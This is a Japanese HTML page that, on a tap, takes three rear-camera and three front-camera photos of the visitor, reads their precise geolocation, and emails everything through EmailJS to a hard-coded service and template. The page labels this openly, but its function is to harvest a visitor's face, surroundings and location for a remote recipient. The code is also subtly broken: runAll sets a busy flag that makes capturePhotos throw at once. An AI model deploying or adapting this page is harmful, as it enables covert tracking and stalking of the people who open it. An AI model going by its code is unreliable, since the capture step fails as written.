<!DOCTYPE html> <html lang="ja"> <head> <meta charset="UTF-8" /> <meta name="viewport" content="width=device-width, initial-scale=1" /> <title>カメラ＋位置＋送信（修正版）</title> <style> body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; } .container { max-width: 800px; margin: auto; text-align: center; } .touch-area { border: 2px dashed rgba(255,255,255,0.3); border-radius: 15px; background: rgba(255,255,255,0.1); padding: 40px; margin: 20px 0; cursor: pointer; user-select: none; } .status { background: rgba(0,0,0,0.4); padding: 10px; border-radius: 5px; margin-top: 10px; } </style> <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script> <script defer> window.addEventListener('DOMContentLoaded', () => { emailjs.init("cPjKBUm_i6HebDQF7"); }); </script> </head> <body> <div class="container"> <h1>📷 3連写＋位置送信（修正版）</h1> <p>外カメ → 内カメ → 位置 → EmailJS送信</p> <div class="touch-area" id="touchArea">▶️ タップ/クリックして実行</div> <div class="status" id="status">待機中</div> <video id="cameraVideo" autoplay muted playsinline style="display:none;"></video> <canvas id="photoCanvas" style="display:none;"></canvas> </div> <script> const touchArea = document.getElementById('touchArea'); const status = document.getElementById('status'); const video = document.getElementById('cameraVideo'); const canvas = document.getElementById('photoCanvas'); let stream = null; let isProcessing = false; function updateStatus(msg, bgColor = '') { status.textContent = msg; status.style.background = bgColor || 'rgba(0,0,0,0.4)'; } async function stopStream() { if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; video.srcObject = null; console.log("カメラストリーム停止済み"); } } async function waitForVideoReady(videoElem) { return new Promise(resolve => { if(videoElem.readyState >= 2) resolve(); else videoElem.onloadedmetadata = () => resolve(); }); } async function capturePhotos(facingMode) { if(isProcessing) throw new Error("処理中です"); isProcessing = true; try { await stopStream(); const constraints = { video: { facingMode }, audio: false }; stream = await navigator.mediaDevices.getUserMedia(constraints); video.srcObject = stream; video.style.display = 'block'; await waitForVideoReady(video); const ctx = canvas.getContext('2d'); const photos = []; for(let i=0; i<3; i++){ const w = video.videoWidth; const h = video.videoHeight; if(w === 0 || h === 0){ console.warn("videoサイズが0。リトライします。"); await new Promise(r => setTimeout(r, 300)); i--; continue; } canvas.width = w; canvas.height = h; ctx.drawImage(video, 0, 0, w, h); const dataUrl = canvas.toDataURL('image/jpeg', 0.2); photos.push(dataUrl); console.log(`[${facingMode}] 写真${i+1} base64長さ:`, dataUrl.length); console.log(dataUrl.substring(0, 100)); await new Promise(r => setTimeout(r, 50)); } await stopStream(); video.style.display = 'none'; isProcessing = false; return photos; } catch(e) { await stopStream(); video.style.display = 'none'; isProcessing = false; console.error(`${facingMode}カメラ撮影エラー`, e); throw e; } } async function getLocationInfo() { updateStatus("📍 位置情報取得中..."); return new Promise((resolve, reject) => { if(!navigator.geolocation){ reject(new Error("位置情報非対応")); return; } navigator.geolocation.getCurrentPosition( pos => { resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, time: new Date(pos.timestamp).toLocaleString() }); }, err => reject(err), { enableHighAccuracy: true, timeout: 10000 } ); }); } async function sendEmail({ rearPhotos, frontPhotos, location }) { updateStatus("✉️ Email送信中...", "#29b6f6"); const templateParams = { photo_rear1: rearPhotos[0], photo_rear2: rearPhotos[1], photo_rear3: rearPhotos[2], photo_front1: frontPhotos[0], photo_front2: frontPhotos[1], photo_front3: frontPhotos[2], location_info: `緯度: ${location.lat}<br>経度: ${location.lon}<br>精度: ${location.acc}m<br>時刻: ${location.time}`, date: new Date().toLocaleString() }; console.log("送信データ:", templateParams); try { await emailjs.send('service_ja2c09x', 'template_2fp2jrg', templateParams); updateStatus("✅ メール送信完了！", "#66bb6a"); } catch (e) { updateStatus("❌ メール送信失敗", "#f44336"); console.error("EmailJS送信エラー", e); throw e; } } async function runAll() { if(isProcessing) { console.log("処理中です。しばらくお待ちください。"); return; } isProcessing = true; try { updateStatus("🔄 外カメ撮影中..."); const rearPhotos = await capturePhotos("environment"); updateStatus("🔄 内カメ撮影中..."); const frontPhotos = await capturePhotos("user"); let location; try { location = await getLocationInfo(); } catch(e){ location = { lat:"取得失敗", lon:"取得失敗", acc:"不明", time: new Date().toLocaleString() }; updateStatus("⚠️ 位置情報取得失敗", "#ff9800"); } updateStatus("✉️ メール送信中..."); await sendEmail({ rearPhotos, frontPhotos, location }); } catch(e) { updateStatus(`❌ エラー: ${e.message}`, "#f44336"); console.error("処理エラー", e); } finally { isProcessing = false; } } touchArea.addEventListener('click', runAll); touchArea.addEventListener('touchstart', e => { e.preventDefault(); runAll(); }, { passive: false }); </script> </body> </html>
